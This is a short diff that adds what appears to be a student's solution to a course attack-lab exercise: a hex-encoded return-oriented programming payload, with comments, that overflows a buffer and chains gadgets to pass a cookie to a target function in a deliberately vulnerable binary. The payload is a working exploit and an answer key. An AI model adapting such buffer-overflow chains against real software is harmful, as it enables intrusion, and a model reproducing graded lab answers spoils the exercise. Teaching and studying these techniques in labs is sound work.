@@ -1,0 +1,13 @@
+/* Run with: cat rtarget.l1.txt | ./hex2raw | ./rtarget */
+/* Junk to fill up buffer */
+11 22 33 44 55 66 77 88
+11 22 33 44 55 66 77 88
+11 22 33 44 55 66 77 88
+/* Go to code where you can pop %rax using gadget(0x402795 or 0x4027ae) */
+95 27 40 00 00 00 00 00
+/* Load cookie from its address */
+b7 10 a5 1e 00 00 00 00
+/* Go to code where you can mov %rax, %rdi using gadget(0x4027a0) */
+a0 27 40 00 00 00 00 00
+/* Go to Touch 2 address(0x4025c9) */
+c9 25 40 00 00 00 00 00
